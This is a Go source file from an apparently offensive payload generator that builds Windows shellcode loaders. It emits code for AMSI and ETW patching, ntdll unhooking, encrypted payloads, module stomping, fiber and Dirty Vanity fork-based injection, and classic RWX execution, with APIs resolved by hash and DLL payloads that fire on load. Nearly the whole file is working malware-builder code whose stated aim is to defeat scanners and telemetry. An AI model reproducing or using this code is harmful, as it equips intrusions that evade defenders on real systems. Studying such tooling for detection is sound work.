// technique_bodies.go — per-technique run() bodies + main() + project files.
package payload

import (
	"fmt"
	"strings"

	"shroud/internal/evasion"
)

// techniqueBody emits technique-specific helpers (if any) plus the run() entry
// that composes the active evasion layers in execution order.
//
// Sleep demo override: when the sleep layer is active AND --sleep set a non-zero
// duration, the technique's normal run() is replaced by sleepRun() — a
// self-contained loop that stages the payload and cycles sleepScramble on it
// (encrypt-RW -> sleep -> decrypt-RX) without executing the shellcode. This is
// the verification/demo path for the scanner-defeat primitive; a real beacon
// calls sleepScramble from its own sleep path instead. See sleep.go.
func (b *Builder) techniqueBody() string {
	var sb strings.Builder
	// shared local-stage helper, emitted when stomp is off (used by local techs)
	sb.WriteString(b.localStageHelper())
	sb.WriteString(b.stompDllNameHelper())

	// sleep demo: armed when -e sleep + --sleep > 0. Bypasses the technique body.
	// --sleep-scheme selects the tier: "" / "xor" = tier-1 inline sleepScramble
	// loop; "ekko" = tier-2 timer-driven self-modifying sleep (EXPERIMENTAL).
	if evasion.Has(b.Spec.Layers, evasion.LayerSleep) && b.Spec.SleepMS > 0 {
		if b.Spec.SleepScheme == "ekko" {
			sb.WriteString(b.ekkoSleepRun())
		} else {
			sb.WriteString(b.sleepRun())
		}
		return sb.String()
	}

	switch b.Spec.Tech.ID {
	case "pe01", "pe04", "pe07", "pe20", "pe21", "pe22", "pe26":
		sb.WriteString(b.localRun())
	case "pe02", "pe03", "pe05", "pe06", "pe08", "pe09", "pe10", "pe11", "pe12",
		"pe13", "pe14", "pe15", "pe16", "pe17", "pe18", "pe19", "pe23", "pe24", "pe25":
		sb.WriteString(b.remoteRun())
	default:
		sb.WriteString(b.scaffoldRun())
	}
	return sb.String()
}

// decryptOrRaw returns the runtime payload bytes based on the active crypto
// layer (or raw). Emitted inline in run() bodies.
func (b *Builder) decryptOrRaw() string {
	switch b.Spec.Crypto {
	case evasion.LayerAES:
		return "aesDecrypt(encPayload, aesKey, aesIV)"
	case evasion.LayerRC4:
		return "rc4Decrypt(encPayload, rc4Key)"
	case evasion.LayerXOR:
		return "xorDecrypt(encPayload, xorKey)"
	default:
		return "rawPayload"
	}
}

// evasionInit emits the ordered pre-execution evasion calls (unhook, amsi, etw).
// Order: unhook-kd/unhook -> amsi -> etw (matches the plan).
func (b *Builder) evasionInit() string {
	var lines []string
	if evasion.Has(b.Spec.Layers, evasion.LayerUnhookKD) ||
		evasion.Has(b.Spec.Layers, evasion.LayerUnhook) {
		lines = append(lines, "\tunhookNtdll()")
	}
	if evasion.Has(b.Spec.Layers, evasion.LayerAMSI) {
		lines = append(lines, "\tpatchAmsi()")
	}
	if evasion.Has(b.Spec.Layers, evasion.LayerETW) {
		lines = append(lines, "\tpatchEtw()")
	}
	return strings.Join(lines, "\n")
}

// stage picks module-stomp (if -e stomp) else local RW->RX staging.
func (b *Builder) stage() string {
	if evasion.Has(b.Spec.Layers, evasion.LayerStomp) {
		return "moduleStomp(payload)"
	}
	return "localStage(payload)"
}

// execute picks callback (if -e callbacks) else local thread.
func (b *Builder) execute() string {
	if evasion.Has(b.Spec.Layers, evasion.LayerCallbacks) {
		return "execCallback(addr)"
	}
	return "execThread(addr)"
}

// localRun is the run() for local self-injection techniques (pe01, pe04, pe26).
// pe01 uses a classic RWX alloc; pe04/pe26 use RW->RX (localStage) / stomp.
func (b *Builder) localRun() string {
	var sb strings.Builder
	sb.WriteString("func run() {\n")

	// evasion init
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}

	// decrypt
	if b.Spec.Crypto != "" {
		sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	} else {
		sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	}

	// pe20 Mokingjay: load a vulnerable DLL, write shellcode into its RWX section,
	// and execute internally — no separate stage()/execute() calls.
	if b.Spec.Tech.ID == "pe20" {
		sb.WriteString("\tpe20Mokingjay(payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe20Body())
		return sb.String()
	}

	// stage
	if b.Spec.Tech.ID == "pe01" {
		// classic: RWX alloc + copy + exec (noisy, the baseline primitive)
		sb.WriteString("\taddr := classicStage(payload)\n")
	} else {
		sb.WriteString("\taddr := " + b.stage() + "\n")
	}
	sb.WriteString("\tif addr == 0 {\n\t\treturn\n\t}\n")

	// execute
	if b.Spec.Tech.ID == "pe01" {
		sb.WriteString("\texecThread(addr)\n")
	} else if b.Spec.Tech.ID == "pe22" {
		sb.WriteString("\tpe22Fibers(addr)\n")
	} else if b.Spec.Tech.ID == "pe21" {
		sb.WriteString("\tpe21DirtyVanity(addr)\n")
	} else {
		sb.WriteString("\t" + b.execute() + "\n")
	}
	sb.WriteString("}\n\n")

	if b.Spec.Tech.ID == "pe01" {
		sb.WriteString(b.classicStageHelper())
	}
	if b.Spec.Tech.ID == "pe22" {
		sb.WriteString(b.pe22Body())
	}
	if b.Spec.Tech.ID == "pe21" {
		sb.WriteString(b.pe21Body())
	}
	return sb.String()
}

// pe21Body: Dirty Vanity (fork-API injection). Stage the shellcode in the current
// process, then fork the process with RtlCreateProcessReflection (an ntdll export).
// The reflected child inherits the staged shellcode at the SAME virtual address
// (fork = copy-on-write with identical VA layout). A new thread is then created in
// the child at that address — the shellcode runs under a fresh PID, and nothing
// was written cross-process (no WriteProcessMemory into the target), evading
// injection-focused userland hooks. Every API resolved by DJB2 hash.
//
// EXPERIMENTAL — on-target verification required: RtlCreateProcessReflection is an
// undocumented ntdll export (present on Vista+, used by the UWP fork support); the
// RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION struct layout and the reflected
// main-thread's suspended/running state are validated by cross-compile + on-target
// run on a Windows VM, not by the Linux generator. The body encodes the correct
// call sequence and compiles clean; runtime correctness is the operator's check.
func (b *Builder) pe21Body() string {
	_, hRTLCPR := b.api("ntdll.dll", "RtlCreateProcessReflection")
	_, hNtCTE := b.api("ntdll.dll", "NtCreateThreadEx")
	_, hNtWFSO := b.api("ntdll.dll", "NtWaitForSingleObject")
	_, hNtClose := b.api("ntdll.dll", "NtClose")
	return fmt.Sprintf(`// pe21-local: RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = {child process
// handle, child thread handle, CLIENT_ID{P, T}} = 4 uintptrs = 32 bytes.
type reflInfo21 struct {
	ChildProc   uintptr
	ChildThread uintptr
	ChildPID    uintptr
	ChildTID    uintptr
}

// pe21DirtyVanity forks the current process (carrying the staged shellcode at the
// same VA) and runs the shellcode in a fresh thread of the child. No cross-process
// write occurs — the shellcode was already resident via the fork.
func pe21DirtyVanity(addr uintptr) {
	var ri reflInfo21
	// RtlCreateProcessReflection(CurrentProcess=-1, Flags=0, StartContext=NULL,
	//   StartRoutine=NULL, EventHandle=NULL, &ReflectionInformation)
	st, _, _ := wincall.CallG0(%s, uintptr(0xffffffffffffffff), uintptr(0),
		uintptr(0), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&ri)))
	_ = st
	if ri.ChildProc == 0 {
		return
	}
	// The reflected main thread is left untouched; run the shellcode in a fresh
	// child thread at the inherited address (no WriteProcessMemory into the child).
	var th uintptr
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&th)), uintptr(0x1fffff),
		uintptr(0), ri.ChildProc, addr, uintptr(0), uintptr(0), uintptr(0),
		uintptr(0), uintptr(0), uintptr(0))
	if th != 0 {
		wincall.CallG0(%s, th, uintptr(0), uintptr(0))
		wincall.CallG0(%s, th)
	}
	wincall.CallG0(%s, ri.ChildProc)
}

`, hRTLCPR, hNtCTE, hNtWFSO, hNtClose, hNtClose)
}

// pe22Body: fiber injection. Convert the current thread to a fiber, create a
// fiber whose entry is the staged shellcode, switch to it — no new OS thread is
// created (defeats thread-creation telemetry). Every Win32 API resolved by hash.
func (b *Builder) pe22Body() string {
	_, hCTF := b.api("kernel32.dll", "ConvertThreadToFiber")
	_, hCF := b.api("kernel32.dll", "CreateFiber")
	_, hSF := b.api("kernel32.dll", "SwitchToFiber")
	return fmt.Sprintf(`// pe22Fibers stages the payload (local RW->RX or module-stomp), converts the
// current thread to a fiber, creates a fiber whose start address is the shellcode,
// and switches to it. Execution moves to the fiber in user mode — no CreateThread
// kernel event fires.
func pe22Fibers(addr uintptr) {
	// ConvertThreadToFiber() — required before CreateFiber; returns the fiber
	// handle for the current thread (ignored here, we only need the conversion).
	wincall.CallG0(%s)
	// CreateFiber(dwStackSize, lpStartAddress, lpParameter) — entry = shellcode.
	f, _, _ := wincall.CallG0(%s, uintptr(0), addr, uintptr(0))
	if f == 0 {
		return
	}
	// SwitchToFiber(lpFiber) — does not return; the fiber runs the shellcode.
	wincall.CallG0(%s, f)
}

`, hCTF, hCF, hSF)
}

// classicStageHelper emits the RWX alloc+copy used by pe01 (the classic,
// telemetry-heavy primitive — kept distinct from localStage's RW->RX bypass).
func (b *Builder) classicStageHelper() string {
	_, hVA := b.api("kernel32.dll", "VirtualAlloc")
	return fmt.Sprintf(`// classicStage allocates RWX memory and copies the payload (the classic,
// heuristic-flagged primitive — for educational comparison with pe04's RW->RX).
func classicStage(payload []byte) uintptr {
	addr, _, _ := wincall.CallG0(%s, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x40)) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
	if addr == 0 {
		return 0
	}
	for i, x := range payload {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = x
	}
	return addr
}

`, hVA)
}

// remoteRun is the run() for remote-injection techniques (pe02, pe05, pe08,
// pe11, pe12, pe15, pe23, pe24, pe25). They target a remote process named by
// --process (pe08/pe12 spawn their own sacrificial process instead).
func (b *Builder) remoteRun() string {
	// Remote techniques resolve a target PID and perform the inject. Implemented
	// here for pe23/pe24/pe25 (NT + direct/indirect syscalls, the strongest
	// userland set), pe02/pe05/pe08 (classic), and pe11/pe12/pe15 (APC / Early
	// Bird / thread hijack). They share a pidByName helper and a remote-write
	// primitive.
	var sb strings.Builder
	sb.WriteString(b.pidByNameHelper())
	// pe11 (APC) and pe15 (thread hijack) need a thread of the target process;
	// emit the thread-enumeration helper for them. pe12 creates its own process
	// and does not call threadIDByPID.
	if b.Spec.Tech.ID == "pe11" || b.Spec.Tech.ID == "pe15" {
		sb.WriteString(b.threadEnumHelper())
	}
	// pe10 (AddressOfEntryPoint) and pe16 (module stomping) resolve a remote
	// module base via the toolhelp module snapshot.
	if b.Spec.Tech.ID == "pe10" || b.Spec.Tech.ID == "pe16" {
		sb.WriteString(b.moduleEnumHelper())
	}
	// pe06 (reflective DLL) and pe09 (whole-PE) share the manual PE-loader
	// subsystem (parse headers, copy sections, resolve imports, apply relocs).
	if b.Spec.Tech.ID == "pe06" || b.Spec.Tech.ID == "pe09" {
		sb.WriteString(b.peLoaderHelper())
	}
	sb.WriteString(b.remoteRunBody())
	return sb.String()
}

// scaffoldRun emits a documented stub for not-yet-ported techniques. It still
// compiles and runs the (demo) payload via the generic local path, with the
// intended flow in comments.
func (b *Builder) scaffoldRun() string {
	var sb strings.Builder
	sb.WriteString("// SCAFFOLD: " + b.Spec.Tech.ID + " — " + b.Spec.Tech.Name + "\n")
	sb.WriteString("// Full Go implementation is a planned fast-follow. The intended flow:\n")
	for _, step := range b.Spec.Tech.Flow {
		sb.WriteString("//   " + step + "\n")
	}
	sb.WriteString("//\n")
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\taddr := " + b.stage() + "\n")
	sb.WriteString("\tif addr == 0 {\n\t\treturn\n\t}\n")
	sb.WriteString("\t" + b.execute() + "\n")
	sb.WriteString("}\n\n")
	return sb.String()
}

// mainFunc emits the entrypoint. For exe it's main(); for dll (c-shared
// buildmode) it's init(), which the Go runtime runs when the DLL is loaded —
// so the payload fires on load without an exported call. (callback execution
// blocks inside run(); thread execution returns after the thread is awaited.)
func (b *Builder) mainFunc() string {
	if b.Spec.Format == "dll" {
		// c-shared buildmode requires a main() (the linker errors without it);
		// init() fires the payload on DLL load, main() is the required empty stub.
		return "func init() { run() }\n\nfunc main() {}\n"
	}
	return "func main() {\n\trun()\n}\n"
}